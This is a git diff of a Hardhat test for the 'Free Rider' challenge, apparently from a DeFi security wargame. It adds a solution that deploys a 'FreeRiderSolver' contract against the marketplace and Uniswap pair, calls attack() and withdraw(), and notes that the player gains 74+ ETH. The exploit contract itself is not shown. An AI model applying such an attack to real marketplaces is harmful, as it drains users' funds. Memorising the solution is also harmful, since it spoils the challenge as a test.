@@ -6,6 +6,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber } = require("ethers");
 
 describe('[Challenge] Free Rider', function () {
     let deployer, player, devs;
@@ -87,6 +88,7 @@ describe('[Challenge] Free Rider', function () {
         for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
             expect(await nft.ownerOf(id)).to.be.eq(deployer.address);
         }
+        
         await nft.setApprovalForAll(marketplace.address, true);
 
         // Open offers in the marketplace
@@ -94,6 +96,7 @@ describe('[Challenge] Free Rider', function () {
             [0, 1, 2, 3, 4, 5],
             [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
         );
+
         expect(await marketplace.offersCount()).to.be.eq(6);
 
         // Deploy devs' contract, adding the player as the beneficiary
@@ -106,6 +109,18 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const freeRiderSolverFactory = await ethers.getContractFactory("FreeRiderSolver", player);
+        const freeRiderSolver = await freeRiderSolverFactory.deploy(
+            marketplace.address,
+            devsContract.address,
+            uniswapPair.address
+        )
+
+        await freeRiderSolver.connect(player).attack() // player calls his contract
+        await freeRiderSolver.connect(player).withdraw(); // player still gets 74+ ETH from the exchange
+
+        console.log(await ethers.provider.getBalance(player.address))
     });
 
     after(async function () {
@@ -116,6 +131,7 @@ describe('[Challenge] Free Rider', function () {
             await nft.connect(devs).transferFrom(devsContract.address, devs.address, tokenId);
             expect(await nft.ownerOf(tokenId)).to.be.eq(devs.address);
         }
+        
 
         // Exchange must have lost NFTs and ETH
         expect(await marketplace.offersCount()).to.be.eq(0);
